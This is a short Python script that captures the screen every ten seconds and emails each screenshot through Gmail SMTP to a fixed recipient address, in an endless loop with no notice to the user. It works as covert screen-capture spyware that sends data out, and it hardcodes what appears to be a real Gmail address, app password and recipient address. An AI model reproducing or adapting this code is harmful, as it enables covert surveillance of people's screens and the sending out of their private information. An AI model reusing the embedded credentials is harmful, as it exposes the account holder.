import os
import pyautogui
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage

# Your Gmail credentials
EMAIL_ADDRESS = 'flortieno@gmail.com'
EMAIL_PASSWORD = 'jxcsapcnfcshtfmy'
def capture_screenshot(filename):
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

def send_email(subject, body, image_filename, recipient_email):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = recipient_email
    msg['Subject'] = subject

    with open(image_filename, 'rb') as image_file:
        image_data = image_file.read()
        image_mime = MIMEImage(image_data, name=image_filename)
        msg.attach(image_mime)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()

    try:
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, recipient_email, msg.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print("An error occurred:", e)
    finally:
        server.quit()

def main(interval, recipient_email):
    while True:
        screenshot_filename = f"screenshot_{int(time.time())}.png"
        capture_screenshot(screenshot_filename)
        send_email('Screenshot', 'Check out this screenshot!', screenshot_filename, recipient_email)

        time.sleep(interval)

if __name__ == "__main__":
    INTERVAL = 10  # seconds, interval for taking screenshots
    RECIPIENT_EMAIL = 'robertlagat38@gmail.com'  # Recipient's email address

    main(INTERVAL, RECIPIENT_EMAIL)
